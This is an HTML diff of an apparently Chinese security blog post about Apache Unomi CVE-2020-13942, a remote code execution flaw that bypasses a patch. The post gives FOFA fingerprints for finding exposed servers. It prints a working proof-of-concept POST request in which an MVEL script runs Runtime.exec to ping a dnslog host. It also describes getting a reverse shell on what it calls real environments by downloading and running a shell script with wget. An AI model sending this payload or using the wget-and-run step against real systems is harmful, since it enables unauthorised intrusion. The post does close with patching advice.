@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya100007s04z8cuy5hjp" class="article article-type-post" itemscope
+    <article id="post-ckwrjlyfu0007ys4zbcu92mff" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -180,7 +180,30 @@
             <h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p>Apache Unomi 是一个基于标准的客户数据平台（CDP，Customer Data Platform），用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验，比如 GDPR 和“不跟踪”偏好设置。其最初于 Jahia 开发，2015 年 10 月 Unomi 成为Apache 软件基金会项目。<span id="more"></span>在Apache Unomi 1.5.1版本之前，攻击者可以通过精心构造的MVEL或ONGl表达式来发送恶意请求，使得Unomi服务器执行任意代码，漏洞对应编号为CVE-2020-11975，而CVE-2020-13942漏洞是对CVE-2020-11975漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。</p>
 <h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><p>参考官方手册：<a target="_blank" rel="noopener" href="http://unomi.apache.org/manual/1_3_x/index.html#_securing_a_production_environment">http://unomi.apache.org/manual/1_3_x/index.html#_securing_a_production_environment</a><br><img src="https://img-blog.csdnimg.cn/20201126100934814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>特征提取（可以根据关键字/iconhash/端口来进行匹配）：<br><img src="https://img-blog.csdnimg.cn/20201126101321284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里推荐一个icon_hash小工具,repo:<a target="_blank" rel="noopener" href="https://github.com/SevenC-base/Gadgets/tree/master/Icon_Hash">https://github.com/SevenC-base/Gadgets/tree/master/Icon_Hash</a><br>exe:<img src="https://img-blog.csdnimg.cn/20201126101824655.png#pic_center" alt="在这里插入图片描述"><br>py:<br><img src="https://img-blog.csdnimg.cn/20201126102032792.png#pic_center" alt="在这里插入图片描述"></p>
 <p>fofa指纹：body=”Welcome to Apache Unomi”，试了下icon_hash，没搜到，可能收录的少，(●—●)，看下站点分布，确实很少，有总比没有强。<br><img src="https://img-blog.csdnimg.cn/20201126103956977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="三、POC测试"><a href="#三、POC测试" class="headerlink" title="三、POC测试"></a>三、POC测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /context.json HTTP/1.1</span><br><span class="line">Host: 目标地址:9443</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36</span><br><span class="line">Content-Length: 495</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;filters&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;boom&quot;</span>,</span><br><span class="line">            <span class="string">&quot;filters&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;condition&quot;</span>: &#123;</span><br><span class="line">                         <span class="string">&quot;parameterValues&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;test&quot;</span>: <span class="string">&quot;script::Runtime r = Runtime.getRuntime(); r.exec(\&quot;ping 2g5344.dnslog.cn\&quot;);&quot;</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;profilePropertyCondition&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;sessionId&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="三、POC测试"><a href="#三、POC测试" class="headerlink" title="三、POC测试"></a>三、POC测试</h2><pre><code class="hljs bash">POST /context.json HTTP/1.1
+Host: 目标地址:9443
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+Content-Length: 495
+
+&#123;
+    <span class="hljs-string">&quot;filters&quot;</span>: [
+        &#123;
+            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;boom&quot;</span>,
+            <span class="hljs-string">&quot;filters&quot;</span>: [
+                &#123;
+                    <span class="hljs-string">&quot;condition&quot;</span>: &#123;
+                         <span class="hljs-string">&quot;parameterValues&quot;</span>: &#123;
+                            <span class="hljs-string">&quot;test&quot;</span>: <span class="hljs-string">&quot;script::Runtime r = Runtime.getRuntime(); r.exec(\&quot;ping 2g5344.dnslog.cn\&quot;);&quot;</span>
+                        &#125;,
+                        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;profilePropertyCondition&quot;</span>
+                    &#125;
+                &#125;
+            ]
+        &#125;
+    ],
+    <span class="hljs-string">&quot;sessionId&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>
+&#125;
+</code></pre>
 <p>查看DNSlog平台，存在解析记录，即<code>ping 2g5344.dnslog.cn </code>命令执行成功。</p>
 <p>测试反弹shell的时候没成功，linux命令执行符号没有执行。<br>常理来说，命令执行结果会被带出来，测试环境执行结果如下：<br><img src="https://img-blog.csdnimg.cn/20201126104636350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>真实环境执执行结果：<br><img src="https://img-blog.csdnimg.cn/20201126104914811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>应该是当做原生字符串了，好在天无绝人之路，使用wget 下载 .sh文件到服务器并执行，成功获取反弹shell。<br><img src="https://img-blog.csdnimg.cn/20201126105307940.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201126105700478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 <h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><p>目前厂商已发布最新版本，请受影响用户及时下载并更新至最新版本。官方链接如下：</p>
